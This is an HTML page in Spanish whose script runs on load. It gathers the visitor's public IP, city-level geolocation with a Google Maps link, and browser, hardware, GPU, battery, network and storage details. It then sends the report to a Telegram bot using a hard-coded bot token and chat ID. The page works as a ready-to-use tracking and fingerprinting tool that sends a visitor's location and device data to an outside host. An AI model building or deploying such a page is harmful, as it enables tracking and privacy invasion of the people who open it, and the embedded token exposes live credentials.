<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>üìä Dispositivo ‚Üí Telegram</title>
  <style>
    body, html {
      margin:0; padding:0;
      width:100%; height:100%;
      display:flex; align-items:center; justify-content:center;
      background:#121212; color:#fff;
      font-family:sans-serif;
    }
    .card {
      background:#1f1f1f;
      padding:2rem; border-radius:12px;
      max-width:380px; width:90%;
      text-align:center;
      box-shadow:0 4px 20px rgba(0,0,0,0.7);
    }
    h1 { margin:0 0 1rem; font-size:1.4rem; }
    .status { margin-top:1rem; font-weight:bold; }
  </style>
</head>
<body>

  <div class="card">
    <h1>Recopilando y enviando‚Ä¶</h1>
    <p class="status" id="status">Iniciando‚Ä¶</p>
  </div>

  <script>
  (async () => {
    const setStatus = txt => document.getElementById('status').textContent = txt;

    // ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî CONFIGURA AQU√ç tus credenciales ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
    const TOKEN   = '8154780362:AAGABBYGZUdz7x0BEju5ypWzycJfu4WB_g8';
    const CHAT_ID = '7270292739';
    // ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

    setStatus('1. IP p√∫blica‚Ä¶');
    let ip = 'ND';
    try { ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip; }
    catch {}

    setStatus('2. Geo IP‚Ä¶');
    let geo = {city:'‚Äì',region:'‚Äì',country:'‚Äì',zip:'‚Äì',isp:'‚Äì',lat:null,lon:null,map:'‚Äì'};
    if (ip!=='ND') {
      try {
        const d = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,zip,isp,lat,lon`)
                         .then(r=>r.json());
        if (d.status==='success') {
          geo = {
            city: d.city, region: d.regionName, country: d.country,
            zip: d.zip, isp: d.isp, lat: d.lat, lon: d.lon,
            map: `https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}`
          };
        }
      } catch {}
    }

    setStatus('3. APIs y entorno‚Ä¶');
    const ua        = navigator.userAgent;
    const plt       = navigator.platform;
    const languages = navigator.languages.join(', ');
    const lang      = navigator.language;
    const tzDev     = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const tzOffset  = new Date().getTimezoneOffset();
    const onLine    = navigator.onLine ? 'S√≠' : 'No';
    const dpr       = window.devicePixelRatio || 1;
    const scrW      = screen.width; 
    const scrH      = screen.height;
    const availW    = screen.availWidth;
    const availH    = screen.availHeight;
    const colorD    = `${screen.colorDepth} bits`;
    const orientation = screen.orientation?.type || 'ND';
    const cores     = navigator.hardwareConcurrency || '‚Äì';
    const ram       = navigator.deviceMemory ? navigator.deviceMemory+' GB (‚âà)' : '‚Äì';

    let battLevel='‚Äì', battCharging='‚Äì', battTime='‚Äì';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battLevel    = Math.round(b.level*100)+' %';
        battCharging = b.charging ? 'S√≠' : 'No';
        battTime     = b.charging
                        ? `Hasta full en ${Math.round(b.chargingTime/60)} min`
                        : `Descarga en ${Math.round(b.dischargingTime/60)} min`;
      } catch {}
    }

    let connInfo='‚Äì';
    if (navigator.connection) {
      const c = navigator.connection;
      connInfo = `${c.effectiveType} @${c.downlink} Mb/s, RTT ${c.rtt} ms, SaveData: ${c.saveData?'S√≠':'No'}`;
    }

    let storage='‚Äì';
    if (navigator.storage?.estimate) {
      try {
        const e = await navigator.storage.estimate();
        storage = e.usage && e.quota
          ? `${(e.usage/1024**3).toFixed(2)}/${(e.quota/1024**3).toFixed(2)} GB`
          : '‚Äì';
      } catch {}
    }

    setStatus('4. WebGL para GPU‚Ä¶');
    // Detecci√≥n WebGL GPU renderer/vendor
    let glRenderer='‚Äì', glVendor='‚Äì';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          glRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          glVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        }
      }
    } catch {}

    setStatus('5. Preparando mensaje‚Ä¶');
    const text = `
<b>üåê Ubicaci√≥n (IP)</b>
üìç ${geo.city}, ${geo.region} (${geo.zip}), ${geo.country}
üè¢ ISP: ${geo.isp}
<a href="${geo.map}">Ver en Maps</a>

<b>üñ• Entorno & Navegador</b>
‚Ä¢ <b>IP:</b> ${ip}
‚Ä¢ <b>Plataforma:</b> ${plt}
‚Ä¢ <b>SO/Navegador:</b> ${ua}
‚Ä¢ <b>Idiomas:</b> ${languages}
‚Ä¢ <b>Idioma ra√≠z:</b> ${lang}
‚Ä¢ <b>Zona horaria:</b> ${tzDev} (offset ${tzOffset} min)
‚Ä¢ <b>L√≠nea:</b> ${onLine}

<b>‚öôÔ∏è Hardware & Pantalla</b>
‚Ä¢ <b>RAM:</b> ${ram}
‚Ä¢ <b>CPU cores:</b> ${cores}
‚Ä¢ <b>GPU:</b> ${glRenderer} / ${glVendor}
‚Ä¢ <b>Pantalla:</b> ${scrW}√ó${scrH} px (@${dpr}√ó)
‚Ä¢ <b>√Årea √∫til:</b> ${availW}√ó${availH}
‚Ä¢ <b>Orientaci√≥n:</b> ${orientation}
‚Ä¢ <b>Profundidad:</b> ${colorD}

<b>üîå Conexi√≥n</b>
‚Ä¢ ${connInfo}

<b>üîã Bater√≠a</b>
‚Ä¢ Nivel: ${battLevel}
‚Ä¢ Cargando: ${battCharging}
‚Ä¢ Tiempo: ${battTime}

<b>üíæ Almacenamiento</b>
‚Ä¢ ${storage}
    `;

    setStatus('6. Enviando a Telegram‚Ä¶');
    const url = 'https://api.telegram.org/bot'+TOKEN+'/sendMessage'
              + '?chat_id='+CHAT_ID
              + '&parse_mode=HTML'
              + '&disable_web_page_preview=true'
              + '&text='+encodeURIComponent(text);

    try {
      const res = await fetch(url);
      setStatus(res.ok ? '‚úÖ Enviado' : '‚ùå Error al enviar');
    } catch {
      setStatus('‚ùå Excepci√≥n al enviar');
    }

  })();
  </script>

</body>
</html>
